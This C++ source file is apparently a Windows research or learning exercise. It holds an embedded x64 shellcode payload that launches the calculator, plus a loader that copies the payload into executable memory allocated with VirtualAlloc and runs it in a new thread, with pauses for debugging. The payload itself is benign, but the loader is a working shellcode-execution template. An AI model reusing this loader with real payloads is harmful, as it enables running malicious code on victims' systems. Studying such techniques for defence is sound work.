#include <stdio.h>
#include <windows.h>

//custom calc payload
unsigned char payload[] = 
    "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    "\x48\x83\xec\x20\x41\xff\xd6";

size_t payload_len = sizeof(payload);

extern "C" void onRamp(PVOID exec_mem);
extern "C" void offRamp(void); 

void FunctionTwo(void){
	//allocate memory
	auto exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	//move paylaod to our buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	printf("Execute payload?\n");
	getchar(); 						//quasi-break-point
	
	//execute payload
    //Reference
    // asm("mov eax, %1;" %1 is input from source
    // "mov %0, eax;"     %0 is output to destination
    // :"=r"(dst)         destination
    // :"r"(src)          source
    // :"eax");           clobber register(s)

	auto th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
	return;
}

void FunctionOne(void){
	printf("FunctionOne!\n");
	getchar(); 						//quasi-break-point
	FunctionTwo();
	return;
}

int main(void){
	printf("Entering main function...\n");
	FunctionOne();
	printf("Exiting main function...\n");
	getchar(); 						//quasi-break-point
    return 0;
}

//x86_64-w64-mingw32-g++.exe main_dirty.cpp ramp.o -o main_dirty.exe